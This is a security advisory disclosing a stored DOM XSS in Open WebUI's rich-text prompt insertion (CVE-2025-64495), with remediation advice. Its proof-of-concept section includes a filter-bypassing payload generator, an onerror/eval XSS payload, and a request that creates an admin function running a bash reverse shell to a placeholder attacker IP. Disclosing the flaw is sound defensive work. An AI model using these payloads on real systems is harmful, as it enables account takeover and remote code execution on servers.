# Open WebUI vulnerable to Stored DOM XSS via prompts when 'Insert Prompt as Rich Text' is enabled resulting in ATO/RCE

**GHSA**: GHSA-w7xj-8fx7-wfch | **CVE**: CVE-2025-64495 | **Severity**: high (CVSS 8.7)

**CWE**: CWE-79

**Affected Packages**:
- **open-webui** (npm): <= 0.6.34
- **open-webui** (pip): <= 0.6.34

## Description

### Summary

The functionality that inserts custom prompts into the chat window is vulnerable to DOM XSS when 'Insert Prompt as Rich Text' is enabled, since the prompt body is assigned to the DOM sink `.innerHtml` without sanitisation. Any user with permissions to create prompts can abuse this to plant a payload that could be triggered by other users if they run the corresponding `/` command to insert the prompt.

### Details

The affected line is https://github.com/open-webui/open-webui/blob/7a83e7dfa367d19f762ec17cac5e4a94ea2bd97d/src/lib/components/common/RichTextInput.svelte#L348

```js
	export const replaceCommandWithText = async (text) => {
		const { state, dispatch } = editor.view;
		const { selection } = state;
		const pos = selection.from;

		// Get the plain text of this document
		// const docText = state.doc.textBetween(0, state.doc.content.size, '\n', '\n');

		// Find the word boundaries at cursor
		const { start, end } = getWordBoundsAtPos(state.doc, pos);

		let tr = state.tr;

		if (insertPromptAsRichText) {
			const htmlContent = marked
				.parse(text, {
					breaks: true,
					gfm: true
				})
				.trim();

			// Create a temporary div to parse HTML
			const tempDiv = document.createElement('div');
			tempDiv.innerHTML = htmlContent;                                          // <---- vulnerable
```

User controlled HTML from the prompt body is assigned to `tempDiv.innerHTML` without (meaningful) sanitisation. `marked.parse` introduces some character limitations but does not sanitise the content, as stated in their README.

<img width="1816" height="498" alt="image" src="https://github.com/user-attachments/assets/bd0980fc-ad87-460a-94b8-02bc94bea1a2" />

### PoC
Create a custom prompt as follows:
<img width="3006" height="1100" alt="image" src="https://github.com/user-attachments/assets/47de7a11-514d-48f9-8c6a-04ab1894f981" />

Via settings, ensure 'Insert Prompt as Rich Text' is enabled:
<img width="2204" height="1268" alt="image" src="https://github.com/user-attachments/assets/f188065f-7c11-4f09-9ced-4e7d2e6f4d48" />

Run the command `/poc` via a chat window.
<img width="2470" height="1332" alt="image" src="https://github.com/user-attachments/assets/5a112f51-210a-43f3-b999-915b1d0e6744" />

Observe the alert is triggered.
<img width="2452" height="1456" alt="image" src="https://github.com/user-attachments/assets/fa15dbd6-44a7-4cfc-bd93-4cc56aac5eea" />

#### RCE
Since admins can naturally run arbitrary Python code on the server via the 'Functions' feature, this XSS could be used to force any admin that triggers it to run one such of these function with Python code of the attackers choosing. 

This can be accomplished by making them run the following fetch request:
```js
fetch("https://<HOST>/api/v1/functions/create", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json",
    "Accept": "application/json"
  },
  body: JSON.stringify({
    id: "pentest_cmd_test",
    name: "pentest cmd test",
    meta: { description: "pentest cmd test" },
    content: "import os;os.system('echo RCE')"
  })
})
```
This cannot be done directly because the `marked.parse` call the HTML is passed through will neutralise payloads containing quotes
<img width="1718" height="482" alt="image" src="https://github.com/user-attachments/assets/6797efbd-4f2e-4570-ad9f-59a65dba1745" />
To get around this strings must be manually constructed from their decimal values using `String.fromCodePoint`. The following Python script automates generating a viable payload from given JavaScript:
```py
payload2 = """
fetch("https://<HOST>/api/v1/functions/create", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json",
    "Accept": "application/json"
  },
  body: JSON.stringify({
    id: "pentest_cmd_test",
    name: "pentest cmd test",
    meta: { description: "pentest cmd test" },
    content: "import os;os.system('bash -c \\\\'/bin/bash -i >& /dev/tcp/x.x.x.x/443 0>&1\\\\'')"
  })
})
""".lstrip().rstrip()

out = ""

for c in payload2:
    out += f"String.fromCodePoint({ord(c)})+"

print(f"<img src=x onerror=eval({out[:-1]})>")
```
An admin that triggers the corresponding payload via a prompt command will trigger a Python function to run that runs a reverse shell payload, giving command line access on the server to the attacker.
<img width="2476" height="756" alt="image" src="https://github.com/user-attachments/assets/01f9e991-832a-4cfb-8c3e-3b2ce02cff15" />

<img width="2492" height="1530" alt="image" src="https://github.com/user-attachments/assets/d08eb48f-a688-41a1-9b52-e91df7ced929" />
<img width="1968" height="916" alt="image" src="https://github.com/user-attachments/assets/2ad6a19e-f151-4ac9-9903-0961e33fe42f" />


### Impact

Any user running the malicious prompt could have their account compromised via malicious JavaScript that reads their session token from localstorage and exfiltrates it to an attacker controlled server.

Admin users running the malicious prompt risk exposing the backend server to remote code execution (RCE) since malicious JavaScript running via the vulnerability can be used to send requests as the admin user that run malicious Python functions, that may run operating system commands.

### Caveats

Low privilege users cannot create prompts by default, the USER_PERMISSIONS_WORKSPACE_PROMPTS_ACCESS permission is needed, which may be given out via e.g. a custom group. see: https://docs.openwebui.com/features/workspace/prompts/#access-control-and-permissions

A victim user running the command to trigger the prompt needs to have the 'Insert Prompt as Rich Text' setting enabled via preferences for the vulnerability to trigger. The setting is off by default. Users with this setting disabled are unaffected.

### Remediation

Sanitise the user controlled HTML with DOMPurify before assigning it to `.innerHtml`
